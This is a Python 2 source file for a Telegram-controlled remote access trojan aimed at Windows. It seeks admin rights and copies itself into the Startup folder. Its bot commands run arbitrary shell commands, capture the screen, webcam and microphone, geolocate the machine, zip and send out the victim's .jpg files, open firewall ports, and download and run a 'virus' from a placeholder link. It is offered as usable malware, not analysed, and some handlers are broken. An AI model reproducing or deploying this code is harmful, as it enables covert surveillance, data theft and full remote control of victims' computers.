#!/usr/bin/env python2.7
''' requirements: telegram.ext,autopy,wget,pyaudio,wave,ctypes,pygame'''

from telegram.ext import Updater , CommandHandler, dispatcher
from cv2 import *
import urllib
import platform
import autopy
import os
import wget
import subprocess
import zipfile
import pyaudio
import wave
import json
import sys
import ctypes
import pygame

''' get admininstrator request'''

def run_as_admin(argv=None, debug=False):
    shell32 = ctypes.windll.shell32
    if argv is None and shell32.IsUserAnAdmin():
        return True

    if argv is None:
        argv = sys.argv
    if hasattr(sys, '_MEIPASS'):
        # Support pyinstaller wrapped program.
        arguments = map(unicode, argv[1:])
    else:
        arguments = map(unicode, argv)
    argument_line = u' '.join(arguments)
    executable = unicode(sys.executable)
    if debug:
        print 'Command line: ', executable, argument_line
    ret = shell32.ShellExecuteW(None, u"runas", executable, argument_line, None, 1)
    if int(ret) <= 32:
        return False
    return None


if __name__ == '__main__':
    ret = run_as_admin()
    if ret is True:
        u = platform.node()

        user = u.replace("-PC", "")

        cmd = 'copy bot.py "c:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"'.format(user)

        command = os.system(cmd)

        def start_method(bot , update):

            my_ip = urllib.urlopen("http://ip.42.pl/raw").read()

            chat_id = update.message.chat_id
            bot.sendMessage(chat_id,"Connected To : "+my_ip)

        def system_info(bot , update):
            data = 'os = '+platform.uname()[0]+' '+platform.uname()[2]+' '+platform.architecture()[0]+'\n'
            data += 'node = '+platform.node()+'\n'
            data += 'User = '+platform.uname()[1]+'\n'
            data += 'system Type = '+platform.uname()[5]+'\n'
            chat_id = update.message.chat_id
            bot.sendMessage(chat_id,"Platform : "+data)

        def screenshot(bot , update):
            image = autopy.bitmap.capture_screen()
            image.save("screen.png")
            chat_id = update.message.chat_id
            photo = open("screen.png", "rb")
            bot.sendPhoto(chat_id,photo,"screen")

        #upload a virus to your host and it will download it and run it
        def virus_method (bot , update):
            url = 'LINK'
            wget.download(url , 'filename')
            chat_id = update.message.chat_id
            bot.sendMessage(chat_id,"[*] Virus Has Been Uploaded ! [*]")
            os.system("start Disa.bat")
            bot.sendMessage(chat_id,"[*] Virus Has Been Run ! [*]")

        def port_method (bot , update):
            os.system(' netsh firewall add portopening protocol = TCP port = 21 name = "TCP/IP" mode = ENABLE scope = SUBNET')
            os.system(' netsh firewall add portopening protocol = TCP port = 22 name = "TCP/IP" mode = ENABLE scope = SUBNET')
            os.system(' netsh firewall add portopening protocol = TCP port = 23 name = "TCP/IP" mode = ENABLE scope = SUBNET')
            os.system(' netsh firewall add portopening protocol = TCP port = 25 name = "TCP/IP" mode = ENABLE scope = SUBNET')
            os.system(' netsh firewall add portopening protocol = TCP port = 53 name = "TCP/IP" mode = ENABLE scope = SUBNET')
            chat_id = update.message.chat_id
            bot.sendMessage(chat_id,"[*] Ports <21-22-23-25-53> Has Been Opened ! [*]")
            

        def pwd_method (bot, update):
            u = str(os.getcwd())
            chat_id = update.message.chat_id
            bot.sendMessage(chat_id,"Path> "+u)


        def system_method (bot , update , args):

            
            chat_id = update.message.chat_id
            exe = ' '.join(args)
            data = exe

            if data[0:2] == 'cd':
                try:
                    os.chdir(data[3:])
                except:
                    bot.sendMessage(chat_id,"NOT Directory !")

            shell_data = subprocess.Popen(data , shell=True,stdout =subprocess.PIPE,
                                                            stderr =subprocess.PIPE,
                                                            stdin  =subprocess.PIPE )

            value = shell_data.stdout.read()+shell_data.stderr.read()
            bot.sendMessage(chat_id,text=value)                           



        def location_method(bot , update):
            chat_id = update.message.chat_id
            ip = urllib.urlopen("http://ip.42.pl/raw").read()
            link = urllib.urlopen("https://ipapi.co/"+ip+"/json/")
            source = link.read()
            text = json.loads(source)
            lang = str(text['longitude'])
            lat  = str(text['latitude'])
            city = text["city"]
            organ = text["org"]
            bot.sendMessage(chat_id,"Langtitude = "+lang)
            bot.sendMessage(chat_id,"Latitude = "+lat)
            bot.sendMessage(chat_id,"City = "+city)
            bot.sendMessage(chat_id,"Organization = "+organ)

        def upload_method(bot , update , args):

            
            path = ''.join(args)
            file_zip = zipfile.ZipFile(path+'\\archive.zip', 'w')
            
            for folder, subfolders, files in os.walk(path):
            
                for file in files:
                    if file.endswith('.jpg'):
                        file_zip.write(os.path.join(folder, file), os.path.relpath(os.path.join(folder,file), path), compress_type = zipfile.ZIP_DEFLATED)
            
            file_zip.close()  
            chat_id = update.message.chat_id
            os.walk(path)
            cmd = "copy archive.zip"+"\t"+str(os.getcwd())+"\\pic.zip"
            u = str(os.getcwd())+"\\pic.zip"
            os.system(cmd)
            bot.send_document(chat_id, document=open(u , 'rb'))
            os.system("del pic.zip")
            os.system("del arvhive.zip")


        def download_method(bot , update , args):
            f = ''.join(args)
            file_id = message.voice.file_id
            newFile = bot.get_file(file_id)
            newFile.download(voice.ogg)


        def webcam_method(bot , update):
            chat_id = update.message.chat_id
            # initialize the camera
            cam = VideoCapture(0)   # 0 -> index of camera
            s, img = cam.read()
            if s:    # frame captured without any errors
                namedWindow("cam-test")
                imshow("cam-test",img)
                waitKey(1)
                destroyWindow("cam-test")
                imwrite("cam.jpg",img) #save image
                bot.send_photo(chat_id, photo=open('cam.jpg', 'rb'))
                os.system("del cam.jpg")    


        def record_method(bot , update , args):
            chat_id = update.message.chat_id
            time = ''.join(args)
            FORMAT = pyaudio.paInt16
            CHANNELS = 2
            RATE = 44100
            CHUNK = 1024
            RECORD_SECONDS = int(time)
            WAVE_OUTPUT_FILENAME = "rec.wav"
            
            audio = pyaudio.PyAudio()
            
            # start Recording
            stream = audio.open(format=FORMAT, channels=CHANNELS,
                            rate=RATE, input=True,
                            frames_per_buffer=CHUNK)
            bot.sendMessage(chat_id,"recording...")
            frames = []
            
            for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
                data = stream.read(CHUNK)
                frames.append(data)
            bot.sendMessage(chat_id,"finished recording")
            
            
            # stop Recording
            stream.stop_stream()
            stream.close()
            audio.terminate()
            
            waveFile = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
            waveFile.setnchannels(CHANNELS)
            waveFile.setsampwidth(audio.get_sample_size(FORMAT))
            waveFile.setframerate(RATE)
            waveFile.writeframes(b''.join(frames))
            waveFile.close()
            bot.send_audio(chat_id, audio=open('rec.wav', 'rb'))
            os.system('del rec.wav')
        
        def music_method(bot , update , args):
            chat_id = update.message.chat_id
            url = ' '.join(args)
            wget.download(url , 'music.mp3')
            bot.sendMessage(chat_id,"Music Has Been Uploaded..")
            pygame.init()
            pygame.mixer.music.load("music.mp3")
            pygame.mixer.music.play()
            bot.sendMessage(chat_id,"Playing ...")
            
        

        def background_method(bot , update , args):
            
            chat_id = update.message.chat_id
            ur = ''.join(args)
            wget.download(ur , 'test.jpg')
            SPI_SETDESKWALLPAPER = 20 
            ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, "test.jpg" , 0)


        def help_method (bot , update):
            help_ = ""
            help_+= "/start    => Connect to target\n"
            help_+= "/sysinfo  => system information\n" 
            help_+= "/screen   => Get ScreenShot\n"
            help_+= "/virus    => Runing Virus(1)\n"
            help_+= "/port     => Opening Port 21-22-23-25-53\n" 
            help_+= "/pwd      => Show Path\n"
            help_+= "/system   => Execute system command [/system echo Hi]\n"
            help_+= "/location => locate the device\n"
            help_+= "/upload   => Upload jpg file from target [/upload c:\\test]\n"
            help_+= "/webcam   => webcam shot\n"
            help_+= "/record   => record micorophone ex:[/record 5]\n"
            help_+= "/music    => playing background music ex:[/music url]\n"
            help_+= "/background => change background ex:[/background url]\n"
            chat_id = update.message.chat_id
            bot.sendMessage(chat_id,help_)

        def loop():
            try:
                update = Updater("API")
                start = CommandHandler("start", start_method)
                update.dispatcher.add_handler(start)

                sysinfo = CommandHandler("sysinfo",system_info)
                update.dispatcher.add_handler(sysinfo)

                photo = CommandHandler('screen',screenshot)
                update.dispatcher.add_handler(photo)

                virus = CommandHandler("virus",virus_method)
                update.dispatcher.add_handler(virus)

                port = CommandHandler("port",port_method)
                update.dispatcher.add_handler(port)

                pwd = CommandHandler("pwd", pwd_method)
                update.dispatcher.add_handler(pwd)

                system = CommandHandler("system", system_method , pass_args=True)
                update.dispatcher.add_handler(system)

                location = CommandHandler("location" , location_method)
                update.dispatcher.add_handler(location)

                upload = CommandHandler("upload", upload_method , pass_args=True)
                update.dispatcher.add_handler(upload)

                download = CommandHandler("download" , download_method , pass_args=True)
                update.dispatcher.add_handler(download)

                webcam = CommandHandler("webcam", webcam_method)
                update.dispatcher.add_handler(webcam)

                record = CommandHandler("record", record_method , pass_args=True)
                update.dispatcher.add_handler(record)
                
                music = CommandHandler("music", music_method , pass_args =True)
                update.dispatcher.add_handler(music)

                background = CommandHandler("background" , background_method , pass_args=True)
                update.dispatcher.add_handler(background)

                help_ = CommandHandler("help",help_method)
                update.dispatcher.add_handler(help_)


                
                update.start_polling()    
            except:
                loop()

        loop()        

    elif ret is None:
        pass
